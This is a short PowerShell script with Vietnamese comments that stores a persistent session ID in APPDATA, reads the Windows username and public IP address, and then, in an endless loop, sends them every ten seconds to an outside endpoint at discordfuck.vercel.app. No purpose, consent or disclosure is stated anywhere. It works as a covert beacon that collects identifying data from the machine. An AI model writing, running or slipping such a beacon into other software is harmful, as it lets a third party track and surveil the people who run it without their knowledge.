$sessionFile = "$env:APPDATA\session_id.txt"

# Tạo session_id nếu chưa có
if (!(Test-Path $sessionFile)) {
    $guid = [guid]::NewGuid().ToString("N").Substring(0, 16)
    Set-Content -Path $sessionFile -Value $guid
}

# Luôn ép kiểu chuỗi cho chắc
$sessionId = (Get-Content -Path $sessionFile -Raw).ToString()
$username  = $env:USERNAME.ToString()

try {
    $ip = (Invoke-RestMethod "https://api.ipify.org?format=json").ip.ToString()
} catch {
    $ip = "0.0.0.0"
}

while ($true) {
    $body = @{
        session  = $sessionId
        username = $username
        ip       = $ip
    } | ConvertTo-Json -Depth 3

    try {
        $res = Invoke-RestMethod -Uri "https://discordfuck.vercel.app/upload" `
                                 -Method POST `
                                 -Body $body `
                                 -ContentType "application/json"

        if ($res.status -eq "success") {
            Write-Host "✔ Uploaded at $(Get-Date -Format 'HH:mm:ss')"
        } elseif ($res.message -like "*Too many requests*") {
            Write-Warning "⚠ Spam detected - wait..."
        } else {
            Write-Warning "❌ Server error: $($res.message)"
        }
    } catch {
        Write-Warning "🚫 Connection failed: $_"
    }

    Start-Sleep -Seconds 10
}
